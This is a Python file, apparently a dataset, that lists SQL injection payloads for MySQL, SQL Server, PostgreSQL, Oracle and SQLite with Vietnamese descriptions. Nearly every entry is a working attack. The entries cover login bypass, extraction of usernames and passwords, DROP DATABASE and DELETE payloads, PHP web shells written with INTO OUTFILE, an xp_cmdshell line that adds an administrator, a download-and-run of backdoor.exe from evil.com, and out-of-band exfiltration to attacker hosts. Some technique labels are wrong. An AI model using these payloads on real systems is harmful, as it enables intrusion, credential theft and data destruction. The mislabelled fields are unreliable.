import pandas as pd

# Rebuild DataFrame with initial entries
sql_injection_payloads = [
  {
    "payload": " OR 1=1 -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE",
    "source": "OWASP SQL Injection Prevention Cheat Sheet"
  },
  {
    "payload": "' UNION SELECT 1,2,3 -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Xác định số cột trong bảng hiện tại",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' UNION SELECT username, password FROM users -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Lấy tên đăng nhập và mật khẩu từ bảng users",
    "source": "OWASP Testing Guide v4"
  },
  {
    "payload": "' UNION SELECT table_name, column_name FROM information_schema.columns -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Lấy thông tin về cấu trúc cơ sở dữ liệu",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' UNION SELECT 1, @@version -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Lấy thông tin phiên bản của MySQL",
    "source": "SQL Injection Cheat Sheet by Invicti"
  },
  {
    "payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) -- -",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Sử dụng hàm EXTRACTVALUE để gây lỗi và hiển thị phiên bản DB",
    "source": "Pentestmonkey SQL Injection Cheat Sheet"
  },
  {
    "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Sử dụng lỗi GROUP BY để trích xuất thông tin",
    "source": "Netsparker SQL Injection Guide"
  },
  {
    "payload": "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1) -- -",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Sử dụng hàm UPDATEXML để gây lỗi và hiển thị user hiện tại",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "' AND 1=1 -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Kiểm tra điều kiện boolean trả về TRUE",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' AND 1=2 -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Kiểm tra điều kiện boolean trả về FALSE",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Trích xuất ký tự đầu tiên của username",
    "source": "OWASP Testing Guide v4"
  },
  {
    "payload": "' AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97 -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Kiểm tra mã ASCII của ký tự trong username",
    "source": "Pentestmonkey SQL Injection Cheat Sheet"
  },
  {
    "payload": "' AND SLEEP(5) -- -",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây trì hoãn 5 giây để xác định lỗ hổng",
    "source": "Pentestmonkey SQL Injection Cheat Sheet"
  },
  {
    "payload": "' AND IF(1=1, SLEEP(5), 0) -- -",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Trì hoãn có điều kiện để xác nhận lỗ hổng",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' AND (SELECT IF(MID(version(),1,1)='5',SLEEP(5),0)) -- -",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định phiên bản MySQL bằng kỹ thuật time-based",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.attackerdomain.com\\\\share\\\\file')) -- -",
    "type": "Out-of-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Cố gắng kết nối đến máy chủ ngoài để gửi dữ liệu đánh cắp",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users WHERE username='admin'),'.malicious.com\\\\share\\\\')) -- -",
    "type": "Out-of-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Trích xuất mật khẩu và gửi đến máy chủ ngoài",
    "source": "Pentestmonkey SQL Injection Cheat Sheet"
  },
  {
    "payload": "' OR 1=1 -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE",
    "source": "OWASP SQL Injection Prevention Cheat Sheet"
  },
  {
    "payload": "' UNION SELECT 1,2,3 -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Xác định số cột trong bảng hiện tại",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' UNION SELECT username, password, 3 FROM users -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Lấy tên đăng nhập và mật khẩu từ bảng users",
    "source": "OWASP Testing Guide v4"
  },
  {
    "payload": "' UNION SELECT name, NULL, NULL FROM sysobjects WHERE xtype='U' -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Liệt kê tất cả các bảng người dùng trong SQL Server",
    "source": "Pentestmonkey SQL Injection Cheat Sheet"
  },
  {
    "payload": "' AND 1=CONVERT(int, (SELECT @@version)) -- ",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây lỗi chuyển đổi kiểu để hiển thị phiên bản SQL Server",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "' AND 1=CONVERT(int, user_name()) -- ",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây lỗi chuyển đổi kiểu để hiển thị tên người dùng hiện tại",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM sysusers)>0 -- ",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định số lượng người dùng trong hệ thống",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM sysobjects WHERE name LIKE 'user%')>0 -- ",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định có bảng nào liên quan đến người dùng hay không",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' OR 1=1 --",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "PostgreSQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE",
    "source": "OWASP SQL Injection Prevention Cheat Sheet"
  },
  {
    "payload": "' UNION SELECT 1,2,3 --",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "PostgreSQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Xác định số cột trong bảng hiện tại",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' UNION SELECT username, password, NULL FROM users --",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "PostgreSQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Lấy tên đăng nhập và mật khẩu từ bảng users",
    "source": "OWASP Testing Guide v4"
  },
  {
    "payload": "' AND 1=CAST((SELECT version()) AS INTEGER) --",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "PostgreSQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây lỗi chuyển đổi kiểu để hiển thị phiên bản PostgreSQL",
    "source": "Pentestmonkey PostgreSQL Injection Cheat Sheet"
  },
  {
    "payload": "' AND 1=CAST((SELECT current_user) AS INTEGER) --",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "PostgreSQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây lỗi chuyển đổi kiểu để hiển thị người dùng hiện tại",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "PostgreSQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định số lượng bảng trong cơ sở dữ liệu",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' AND SUBSTR((SELECT version()),1,1)='P' --",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "PostgreSQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định chữ cái đầu tiên của phiên bản PostgreSQL",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' AND (SELECT pg_sleep(5)) --",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "PostgreSQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây trì hoãn 5 giây để xác định lỗ hổng",
    "source": "Pentestmonkey PostgreSQL Injection Cheat Sheet"
  },
  {
    "payload": "' AND CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "PostgreSQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định sự tồn tại của người dùng admin bằng kỹ thuật time-based",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' OR 1=1 --",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "Oracle",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE",
    "source": "OWASP SQL Injection Prevention Cheat Sheet"
  },
  {
    "payload": "' UNION SELECT NULL,NULL,NULL FROM dual --",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "Oracle",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Xác định số cột trong bảng hiện tại",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' UNION SELECT username, password, NULL FROM all_users --",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "Oracle",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Lấy tên đăng nhập và mật khẩu từ bảng all_users",
    "source": "OWASP Testing Guide v4"
  },
  {
    "payload": "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "Oracle",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Sử dụng lỗi CTXSYS để hiển thị phiên bản Oracle",
    "source": "Pentestmonkey Oracle Injection Cheat Sheet"
  },
  {
    "payload": "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||USER||CHR(62))) FROM dual) --",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "Oracle",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Sử dụng lỗi XMLType để hiển thị người dùng hiện tại",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM all_tables)>0 --",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "Oracle",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định số lượng bảng trong cơ sở dữ liệu",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' AND SUBSTR((SELECT user FROM dual),1,1)='S' --",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "Oracle",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định chữ cái đầu tiên của người dùng hiện tại",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0 --",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "Oracle",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây trì hoãn 5 giây để xác định lỗ hổng",
    "source": "Pentestmonkey Oracle Injection Cheat Sheet"
  },
  {
    "payload": "' AND CASE WHEN (USER='SYSTEM') THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END=0 --",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "Oracle",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định người dùng hiện tại là SYSTEM bằng kỹ thuật time-based",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' OR 1=1 --",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQLite",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE",
    "source": "OWASP SQL Injection Prevention Cheat Sheet"
  },
  {
    "payload": "' UNION SELECT 1,2,3 --",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQLite",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Xác định số cột trong bảng hiện tại",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' UNION SELECT name, sql, NULL FROM sqlite_master --",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQLite",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Lấy tên và cấu trúc của các bảng trong SQLite",
    "source": "OWASP Testing Guide v4"
  },
  {
    "payload": "' AND 1=CAST((SELECT sqlite_version()) AS INTEGER) --",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "SQLite",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây lỗi chuyển đổi kiểu để hiển thị phiên bản SQLite",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' AND 1=RANDOMBLOB(1000000000) --",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "SQLite",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây lỗi do yêu cầu quá nhiều bộ nhớ",
    "source": "Pentestmonkey SQLite Injection Cheat Sheet"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM sqlite_master)>0 --",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQLite",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định số lượng bảng trong cơ sở dữ liệu",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' AND SUBSTR((SELECT sqlite_version()),1,1)='3' --",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQLite",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định chữ số đầu tiên của phiên bản SQLite",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) --",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQLite",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây trì hoãn bằng cách thực hiện tác vụ nặng",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' AND (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 1 END) --",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQLite",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây trì hoãn có điều kiện để xác nhận lỗ hổng",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "'; DROP DATABASE test; -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa toàn bộ cơ sở dữ liệu test",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; DROP TABLE IF EXISTS admin; -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa bảng admin nếu tồn tại",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; DROP DATABASE test; -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa toàn bộ cơ sở dữ liệu test",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "'; IF EXISTS(SELECT * FROM sysobjects WHERE name='admin') DROP TABLE admin; -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa bảng admin nếu tồn tại",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; SELECT BIN_TO_UUID(UNHEX(SHA2('pwd',512))) INTO OUTFILE '/var/www/html/backdoor.php' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Tạo file PHP có thể được sử dụng cho backdoor",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; SELECT '<?php echo(`cat /etc/passwd`);?>' INTO OUTFILE '/var/www/html/read_passwd.php' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Tạo script PHP để đọc file /etc/passwd trên máy chủ",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /ADD && net localgroup Administrators hacker /ADD' -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Thêm người dùng mới vào nhóm Administrators",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://evil.com/backdoor.exe C:\\backdoor.exe && C:\\backdoor.exe' -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Tải và thực thi file thực thi độc hại",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; UPDATE users SET email='attacker@evil.com' WHERE privilege='admin' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Thay đổi email của tất cả tài khoản admin",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; UPDATE users SET email=CONCAT(username,'@evil.com') -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Sửa đổi email của tất cả người dùng thành dạng username@evil.com",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; UPDATE users SET email='attacker@evil.com' WHERE privilege='admin' -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Thay đổi email của tất cả tài khoản admin",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "'; UPDATE users SET email=username+'@evil.com' -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Sửa đổi email của tất cả người dùng thành dạng username@evil.com",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; UPDATE users SET password='hacked' WHERE username='admin' AND 1=1; -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Thay đổi mật khẩu của admin với điều kiện boolean",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; UPDATE users SET is_admin=1 WHERE username='attacker' AND (SELECT 1 FROM dual WHERE 1=1); -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Nâng quyền người dùng 'attacker' thành admin với điều kiện boolean",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; UPDATE users SET password='hacked' WHERE username='admin' AND 1=1; -- ",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Thay đổi mật khẩu của admin với điều kiện boolean",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "'; UPDATE users SET is_admin=1 WHERE username='attacker' AND (SELECT 1 WHERE 1=1); -- ",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Nâng quyền người dùng 'attacker' thành admin với điều kiện boolean",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; UPDATE users SET password='hacked' WHERE username='admin' AND IF(1=1, SLEEP(5), 0); -- -",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Thay đổi mật khẩu của admin với điều kiện time-based",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; UPDATE users SET is_admin=1 WHERE username='attacker' AND (SELECT SLEEP(5)); -- -",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Nâng quyền người dùng 'attacker' thành admin với điều kiện time-based",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; UPDATE users SET password='hacked' WHERE username='admin'; WAITFOR DELAY '0:0:5'; -- ",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Thay đổi mật khẩu của admin với điều kiện time-based",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "'; UPDATE users SET is_admin=1 WHERE username='attacker'; WAITFOR DELAY '0:0:5'; -- ",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Nâng quyền người dùng 'attacker' thành admin với điều kiện time-based",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; DELETE FROM users WHERE username!='admin' AND 1=1; -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa tất cả người dùng trừ admin với điều kiện boolean",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "' AND (SELECT TOP 1 name FROM sysobjects WHERE id=1)>'a' -- ",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định chữ cái đầu tiên của tên đối tượng đầu tiên",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "' UNION SELECT 1,2,LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users WHERE id=1),'.attackerdomain.com\\\\share\\\\')) -- -",
    "type": "Out-of-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Trích xuất mật khẩu và gửi dữ liệu đến máy chủ của kẻ tấn công",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; SELECT ... INTO OUTFILE '\\\\\\\\attackerip\\\\share\\\\output.txt' -- -",
    "type": "Out-of-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Xuất dữ liệu truy vấn đến chia sẻ SMB từ xa",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; EXEC master..xp_dirtree '\\\\attackerserver\\share' -- ",
    "type": "Out-of-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Tạo kết nối SMB đến máy chủ của kẻ tấn công",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "'; DECLARE @q VARCHAR(8000);SET @q=CAST(0x4445434C415245204054207661726368617228363535333529204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C40432057484944 AS VARCHAR(8000));EXEC(@q); -- ",
    "type": "Out-of-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Thực thi mã T-SQL được mã hóa HEX để che giấu hành động",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' UNION SELECT 1,2,'<?php system($_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/html/cmd.php' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Tạo webshell PHP đơn giản",
    "source": "Pentestmonkey MySQL Injection Cheat Sheet"
  },
  {
    "payload": "' UNION SELECT 1,2,'<?php echo \"<pre>\"; system($_REQUEST[\"cmd\"]); echo \"</pre>\"; ?>' INTO OUTFILE '/var/www/html/shell.php' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Tạo webshell PHP với định dạng đầu ra",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây trì hoãn 5 giây sử dụng subquery",
    "source": "Pentestmonkey MySQL Injection Cheat Sheet"
  },
  {
    "payload": "' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5,SLEEP(5),0) -- -",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Kiểm tra số lượng bảng trong database hiện tại",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='a' -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Kiểm tra ký tự đầu tiên của bảng đầu tiên",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%') -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Kiểm tra mật khẩu của admin bắt đầu bằng 'a'",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "' AND 1=(SELECT 1/0 FROM sysobjects WHERE name='users') -- ",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
